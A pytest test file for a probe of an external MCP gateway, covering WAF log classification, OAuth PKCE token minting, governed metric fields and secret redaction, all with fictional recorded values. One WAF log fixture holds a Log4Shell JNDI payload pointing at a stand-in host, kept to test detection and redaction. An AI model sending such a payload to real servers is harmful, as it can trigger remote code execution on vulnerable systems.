# SPDX-License-Identifier: MIT-0
"""ADR-150: the external MCP probe judges each case from positive evidence, and leaks nothing.

Every input is a recorded shape with fictional values: no AWS call and no network request runs.
"""

from __future__ import annotations

import base64
import hashlib
import json
import sys
from collections.abc import Mapping
from pathlib import Path
from typing import Any

import pytest
from fictional_tokens import fictional_jwt

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "validation"))
sys.path.insert(0, str(_ROOT))

from validation import probe_external_mcp as probe  # noqa: E402

pytestmark = [pytest.mark.unit, pytest.mark.covers("ADR-150")]

Layer = probe.Layer
RULE = "These are finished governed figures."
FICTIONAL_TOKEN = fictional_jwt({"sub": "fictional-subject"}, signature="fictional-signature-part")


def _reply(  # noqa: PLR0913 - one keyword per reply field a case judges
    status: int = 200,
    *,
    challenge: bool = False,
    code: int | None = None,
    message: str = "",
    result: Mapping[str, object] | None = None,
) -> probe.McpReply:
    return probe.McpReply(status, challenge, "", code, message, result)


def _record(outcome: str, method: str, *, bearer: bool) -> probe.InterceptorRecord:
    return probe.InterceptorRecord(outcome=outcome, jsonrpc_method=method, bearer_present=bearer)


# ---------------------------------------------------------------------------
# The case table
# ---------------------------------------------------------------------------


class TestTheCaseTable:
    def test_a_row_prints_expected_observed_and_verdict(self) -> None:
        assert probe.CaseResult("1c", "any non-2xx", "HTTP 401", True).row() == (
            "CASE 1c | any non-2xx | HTTP 401 | PASS"
        )

    def test_a_stopping_fail_ends_the_run_and_a_non_stopping_one_does_not(self) -> None:
        run = probe.Run()
        run.record(probe.CaseResult("1", "x", "x", True))
        run.record(probe.CaseResult("2", "PRM", "absent", False, stops=False))
        assert run.passed

        with pytest.raises(probe.StopRunError, match="case 3 failed"):
            run.record(probe.CaseResult("3", "200", "401", False))
        assert not run.passed

    def test_case_1_passes_on_any_non_2xx_and_fails_on_a_2xx(self) -> None:
        assert probe.anonymous_refused(_reply(401, challenge=True))
        assert probe.anonymous_refused(_reply(502))
        assert not probe.anonymous_refused(_reply(200, result={}))

    def test_proof_1_needs_the_waf_s_own_refusal(self) -> None:
        assert probe.waf_blocked(
            _reply(403, code=-32002, message="Authorization error - Request forbidden")
        )
        assert not probe.waf_blocked(_reply(403, code=-32002, message="insufficient_scope"))

    def test_only_dev_is_accepted_before_any_call(self, monkeypatch: pytest.MonkeyPatch) -> None:
        def no_session(**_kwargs: object) -> None:
            raise AssertionError("an AWS session was created before the environment check")

        monkeypatch.setattr(probe.boto3, "Session", no_session)
        probe.require_dev("dev")
        with pytest.raises(SystemExit, match="accepts only --environment dev"):
            probe.main(
                [
                    "--profile",
                    "<profile>",
                    "--environment",
                    "prod",
                    "--region",
                    "us-east-1",
                    "--expected-account",
                    "<account>",
                    "--case",
                    "pass1",
                ]
            )


# ---------------------------------------------------------------------------
# Demo arguments against the generated contract
# ---------------------------------------------------------------------------


class TestTheDemoCalls:
    def test_every_demo_call_matches_the_generated_tool_schema(self) -> None:
        document = json.loads((_ROOT / "contracts/generated/tools.json").read_text())
        assert probe.validate_demo_calls(document) == []
        assert [case for case, _, _ in probe.DEMO_CALLS] == ["Q1", "Q2", "Q3", "G"]

    def test_an_undeclared_argument_or_a_missing_required_one_is_refused(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        document = json.loads((_ROOT / "contracts/generated/tools.json").read_text())
        calls: tuple[tuple[str, str, Mapping[str, object]], ...] = (
            (
                "Q2",
                "measurement_metric_by_grain",
                {"metric_reference": "ad spend", "grain": "month"},
            ),
            ("X", "measurement_by_month", {}),
        )
        monkeypatch.setattr(probe, "DEMO_CALLS", calls)
        assert probe.validate_demo_calls(document) == [
            "Q2: measurement_metric_by_grain declares no argument grain",
            "Q2: measurement_metric_by_grain requires grains",
            "X: measurement_by_month is not a declared tool",
        ]

    def test_a_tool_is_listed_under_its_target_prefix(self) -> None:
        assert probe.gateway_tool_name("catalog_list_metrics") == "catalog___catalog_list_metrics"
        assert probe.gateway_tool_name("measurement_top_n") == "measurement___measurement_top_n"
        with pytest.raises(ValueError, match="no target"):
            probe.gateway_tool_name("presentation_publish")


# ---------------------------------------------------------------------------
# Reading an MCP reply
# ---------------------------------------------------------------------------


class TestReadingAReply:
    def test_a_challenge_names_its_resource_metadata(self) -> None:
        reply = probe.mcp_reply(
            401,
            {
                "WWW-Authenticate": (
                    'Bearer resource_metadata="https://gw.example/.well-known/x", scope="openid"'
                )
            },
            "",
        )
        assert reply.www_authenticate
        assert reply.resource_metadata == "https://gw.example/.well-known/x"

    def test_an_sse_body_is_read_as_its_last_message(self) -> None:
        message = {"jsonrpc": "2.0", "id": 1, "error": {"code": -32002, "message": "m"}}
        body = f"event: message\ndata: {json.dumps(message)}\n\n"
        reply = probe.mcp_reply(403, {"content-type": "text/event-stream"}, body)
        assert (reply.rpc_code, reply.rpc_message) == (-32002, "m")

    def test_a_tool_result_is_parsed_from_structured_or_text_content(self) -> None:
        answer: dict[str, object] = {"data": {"values": []}}
        as_text = _reply(result={"content": [{"type": "text", "text": json.dumps(answer)}]})
        as_structured = _reply(result={"structuredContent": answer, "content": []})
        assert probe.tool_result(as_text) == answer
        assert probe.tool_result(as_structured) == answer
        assert (
            probe.tool_result(_reply(result={"content": [{"type": "text", "text": "not json"}]}))
            is None
        )


# ---------------------------------------------------------------------------
# Which layer refused
# ---------------------------------------------------------------------------


class TestTheRefusingLayer:
    def test_a_gateway_401_with_no_interceptor_record_is_the_gateway(self) -> None:
        reply = _reply(401, challenge=True, code=-32001, message="Missing Bearer token")
        assert probe.refusal_layer(reply, [], "initialize") is Layer.GATEWAY

    def test_the_interceptor_s_own_refusal_and_record_is_the_interceptor(self) -> None:
        reply = _reply(401, code=-32001, message="unauthorized")
        records = [_record("unauthorized", "tools/list", bearer=False)]
        assert probe.refusal_layer(reply, records, "tools/list") is Layer.INTERCEPTOR

    def test_a_refusal_with_a_forwarded_record_for_the_method_is_ambiguous(self) -> None:
        reply = _reply(401, challenge=True)
        records = [_record("forwarded", "initialize", bearer=True)]
        assert probe.refusal_layer(reply, records, "initialize") is Layer.AMBIGUOUS

    def test_an_interceptor_code_without_its_record_is_ambiguous(self) -> None:
        assert probe.refusal_layer(_reply(200, code=-32001), [], "tools/call") is Layer.AMBIGUOUS

    def test_an_answer_is_admitted_and_a_waf_block_is_the_waf(self) -> None:
        assert probe.refusal_layer(_reply(200, result={}), [], "initialize") is Layer.ADMITTED
        blocked = _reply(403, code=-32002, message="Authorization error - Request forbidden")
        assert probe.refusal_layer(blocked, [], "initialize") is Layer.WAF

    def test_a_record_projection_keeps_three_fields(self) -> None:
        record = probe.InterceptorRecord.from_log(
            {
                "outcome": "unauthorized",
                "jsonrpc_method": "initialize",
                "bearer_present": False,
                "x": "y",
            }
        )
        assert record == _record("unauthorized", "initialize", bearer=False)


# ---------------------------------------------------------------------------
# The web ACL's records
# ---------------------------------------------------------------------------

_COUNTED_LOG4J: dict[str, Any] = {
    "action": "ALLOW",
    "terminatingRuleId": "Default_Action",
    "nonTerminatingMatchingRules": [{"ruleId": "AwsKnownBadInputs", "action": "COUNT"}],
    "ruleGroupList": [
        {
            "ruleGroupId": "AWS#AWSManagedRulesKnownBadInputsRuleSet",
            "terminatingRule": {
                "ruleId": "Log4JRCE_HEADER",
                "action": "BLOCK",
                "ruleMatchDetails": [
                    {"conditionType": "REGEX", "location": "HEADER", "matchedData": ["${jndi"]}
                ],
            },
        }
    ],
    "httpRequest": {"headers": [{"name": "user-agent", "value": "${jndi:ldap://probe.invalid/a}"}]},
}
_BLOCKED_LOG4J: dict[str, Any] = {
    **_COUNTED_LOG4J,
    "action": "BLOCK",
    "terminatingRuleId": "AwsKnownBadInputs",
    "nonTerminatingMatchingRules": [],
}
_COUNTED_SIZE: dict[str, Any] = {
    "action": "ALLOW",
    "terminatingRuleId": "Default_Action",
    "nonTerminatingMatchingRules": [
        {"ruleId": "BodySizeAll", "action": "COUNT", "ruleMatchDetails": [{"location": "BODY"}]}
    ],
}


class TestTheWafClassifier:
    def test_exactly_one_counted_control_is_coverage_with_no_other_match(self) -> None:
        verdict = probe.classify_waf([probe.WafRecord.from_log(_COUNTED_LOG4J)], blocking=False)
        assert verdict.only_the_control
        assert verdict.describe() == "controls 1, other records 0"

    def test_an_extra_record_is_reported_by_rule_and_component_for_the_owner(self) -> None:
        records = [
            probe.WafRecord.from_log(_COUNTED_LOG4J),
            probe.WafRecord.from_log(_COUNTED_SIZE),
        ]
        verdict = probe.classify_waf(records, blocking=False)
        assert not verdict.only_the_control
        assert verdict.describe() == (
            "controls 1, other records 1: ALLOW Default_Action BodySizeAll [BODY]"
        )

    def test_no_control_is_no_coverage(self) -> None:
        assert not probe.classify_waf([], blocking=False).only_the_control

    def test_in_block_mode_only_the_blocked_control_counts(self) -> None:
        blocked = probe.WafRecord.from_log(_BLOCKED_LOG4J)
        assert probe.classify_waf([blocked], blocking=True).only_the_control
        assert not probe.classify_waf(
            [probe.WafRecord.from_log(_COUNTED_LOG4J)], blocking=True
        ).only_the_control
        assert not probe.classify_waf([blocked], blocking=False).only_the_control

    def test_the_projection_keeps_no_header_or_matched_value(self) -> None:
        record = probe.WafRecord.from_log(_COUNTED_LOG4J)
        assert "jndi" not in repr(record)
        assert record.locations == ("HEADER",)
        # pragma: allowlist nextline secret (A-ENTROPY-IDENTIFIER-001)
        assert "AWSManagedRulesKnownBadInputsRuleSet/Log4JRCE_HEADER" in record.matched_rules


# ---------------------------------------------------------------------------
# The decided branch for `resource` at /oauth2/token (design finding 1)
# ---------------------------------------------------------------------------


class _Login:
    def __init__(self, *answers: probe.Redemption) -> None:
        self.answers = list(answers)
        self.authorized = 0
        self.redeemed: list[bool] = []
        self.verifiers: list[str] = []

    def authorize(self, pkce: probe.Pkce) -> str:
        self.authorized += 1
        self.verifiers.append(pkce.verifier)
        return f"code-{self.authorized}"

    def redeem(self, _code: str, _pkce: probe.Pkce, with_resource: bool) -> probe.Redemption:
        self.redeemed.append(with_resource)
        return self.answers.pop(0)


class TestTheResourceBranch:
    def test_an_accepted_resource_redeems_once(self) -> None:
        login = _Login(probe.Redemption(200, "", FICTIONAL_TOKEN))
        minted = probe.mint_with_resource_branch(login.authorize, login.redeem)
        assert minted.resource_on_redeem == "accepted"
        assert (login.authorized, login.redeemed) == (1, [True])

    def test_a_400_records_the_refusal_then_a_fresh_authorize_redeems_without_resource(
        self,
    ) -> None:
        login = _Login(
            probe.Redemption(400, "invalid_request"), probe.Redemption(200, "", FICTIONAL_TOKEN)
        )
        minted = probe.mint_with_resource_branch(login.authorize, login.redeem)
        assert minted.resource_on_redeem == "refused: invalid_request"
        assert minted.access_token == FICTIONAL_TOKEN
        assert (login.authorized, login.redeemed) == (2, [True, False])
        assert len(set(login.verifiers)) == 2

    @pytest.mark.parametrize("status", [401, 500])
    def test_any_other_failure_stops(self, status: int) -> None:
        login = _Login(probe.Redemption(status, "invalid_client"))
        with pytest.raises(probe.StopRunError, match=f"HTTP {status} invalid_client"):
            probe.mint_with_resource_branch(login.authorize, login.redeem)
        assert login.redeemed == [True]

    def test_a_failed_redemption_without_resource_stops(self) -> None:
        login = _Login(
            probe.Redemption(400, "invalid_request"), probe.Redemption(400, "invalid_grant")
        )
        with pytest.raises(probe.StopRunError, match="without resource failed"):
            probe.mint_with_resource_branch(login.authorize, login.redeem)

    def test_the_pkce_challenge_is_s256_of_the_verifier(self) -> None:
        pkce = probe.Pkce(verifier="fictional-pkce-verifier-spelled-out-for-tests-0001")
        digest = hashlib.sha256(pkce.verifier.encode("ascii")).digest()
        assert pkce.challenge == base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")
        assert "=" not in pkce.challenge
        assert pkce.verifier not in repr(pkce)
        assert len(probe.Pkce.new().verifier) >= 43


# ---------------------------------------------------------------------------
# Proof 2: governed fields on parsed JSON
# ---------------------------------------------------------------------------

_LABELS = {"ad_spend": "Ad spend", "roas_attributed_14d": "ROAS (attributed, 14 day)"}
_PERIOD = [{"start": "2026-09-01", "end": "2026-09-30"}]


def _measured(labels: list[str], **extra: object) -> dict[str, Any]:
    data: dict[str, Any] = {
        "values": [],
        "claim_fields": [{"name": f"f{i}", "label": label} for i, label in enumerate(labels)],
    }
    metadata: dict[str, Any] = {
        "measurement_basis": ["attributed"],
        "requested_coverage_intervals": _PERIOD,
        "coverage_holes": [],
        "semantic_qualifiers": [],
    }
    for key, value in extra.items():
        (data if key in {"values", "additivity"} else metadata)[key] = value
    return {"data": data, "metadata": metadata}


class TestGovernedFields:
    def test_q1_rows_carry_dictionary_labels_and_no_period(self) -> None:
        rows = [{"metric": name, "label": label} for name, label in _LABELS.items()]
        good = {
            "data": {"values": rows},
            "metadata": {
                "measurement_basis": ["platform"],
                "requested_coverage_intervals": [],
                "coverage_start": "2026-10-22T00:00:00Z",
                "coverage_end": "2026-10-22T00:00:00Z",
            },
        }
        assert probe.check_q1(good, _LABELS).passed
        with_period = {
            **good,
            "metadata": {**good["metadata"], "requested_coverage_intervals": _PERIOD},
        }
        assert not probe.check_q1(with_period, _LABELS).passed
        relabelled = {**good, "data": {"values": [{"metric": "ad_spend", "label": "Spend"}]}}
        assert not probe.check_q1(relabelled, _LABELS).passed

    def test_q2_needs_exactly_one_ad_spend_field_a_period_and_no_window(self) -> None:
        assert probe.check_q2(_measured(["Ad spend"])).passed
        assert not probe.check_q2(_measured([])).passed, "an empty label list must not pass"
        assert not probe.check_q2(_measured(["Ad spend", "Ad spend"])).passed
        assert not probe.check_q2(_measured(["Ad spend"], requested_coverage_intervals=[])).passed
        windowed = _measured(
            ["Ad spend"],
            semantic_qualifiers=[{"field": "attribution_window", "left": 14, "right": None}],
        )
        assert not probe.check_q2(windowed).passed

    def test_q3_needs_the_windowed_label_and_the_14_day_qualifier(self) -> None:
        window = [{"field": "attribution_window", "left": 14, "right": None}]
        assert probe.check_q3(
            _measured(["Rank", "ROAS (attributed, 14 day)"], semantic_qualifiers=window)
        ).passed
        assert not probe.check_q3(_measured(["ROAS (attributed, 14 day)"])).passed

    def test_coverage_holes_are_recorded_not_failed(self) -> None:
        check = probe.check_q2(_measured(["Ad spend"], coverage_holes=[_PERIOD[0]]))
        assert check.passed
        assert check.notes == ("coverage_holes 1",)

    def test_case_g_across_networks_needs_the_ecosystem_non_additivity_rule(self) -> None:
        rows = [{"ecosystem_key": "amazon_ads"}, {"ecosystem_key": "dsp"}]
        label = "Attributed revenue (14 day, advertised products)"
        ruled = _measured(
            [label], values=rows, additivity={"across": ["ecosystem_key"], "instruction": "no sum"}
        )
        assert probe.check_governance(ruled).passed
        assert not probe.check_governance(_measured([label], values=rows)).passed

    def test_case_g_with_one_network_is_recorded_not_failed(self) -> None:
        label = "Attributed revenue (14 day, advertised products)"
        check = probe.check_governance(_measured([label], values=[{"ecosystem_key": "amazon_ads"}]))
        assert check.passed
        assert check.notes == ("single network in dev",)
        assert not probe.check_governance(_measured(["Attributed revenue"], values=[])).passed

    def test_the_tool_list_is_the_five_declared_tools_each_ending_with_the_rule(self) -> None:
        names = [
            "catalog___catalog_list_metrics",
            "catalog___catalog_describe_metric",
            "measurement___measurement_metric_by_grain",
            "measurement___measurement_compare_windows",
            "measurement___measurement_top_n",
        ]
        tools = [{"name": name, "description": f"What it does. {RULE}"} for name in names]
        assert probe.check_tools_list(_reply(result={"tools": tools}), RULE).passed
        tools[0]["description"] = "What it does."
        assert not probe.check_tools_list(_reply(result={"tools": tools}), RULE).passed
        assert not probe.check_tools_list(_reply(result={"tools": tools[1:]}), RULE).passed

    def test_the_dictionary_labels_come_from_the_metric_dictionary(self) -> None:
        labels = probe.dictionary_labels()
        assert labels["ad_spend"] == "Ad spend"


# ---------------------------------------------------------------------------
# Redaction
# ---------------------------------------------------------------------------


class TestRedaction:
    def test_a_token_and_each_of_its_parts_are_redacted(self) -> None:
        text = f"Bearer {FICTIONAL_TOKEN} and payload {FICTIONAL_TOKEN.split('.')[1]}"
        redacted = probe.redact(text, [FICTIONAL_TOKEN])
        assert FICTIONAL_TOKEN not in redacted
        for part in FICTIONAL_TOKEN.split("."):
            assert part not in redacted

    def test_printed_rows_and_written_evidence_hold_no_secret(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        verifier = "fictional-pkce-verifier-value-0123456789"
        code = "fictional-authorization-code-value"
        monkeypatch.setattr(probe, "_EVIDENCE", tmp_path)
        monkeypatch.setattr(probe, "_ROOT", tmp_path)
        run = probe.Run(secrets=[FICTIONAL_TOKEN, verifier, code])
        run.record(probe.CaseResult("3", "200", f"saw {FICTIONAL_TOKEN} {verifier} {code}", True))
        written = probe._write_evidence(run, "pass1").read_text()  # pyright: ignore[reportPrivateUsage]
        printed = capsys.readouterr().out
        for secret in (FICTIONAL_TOKEN, verifier, code, *FICTIONAL_TOKEN.split(".")):
            assert secret not in written
            assert secret not in printed
        assert json.loads(written)["results"][0]["passed"] is True
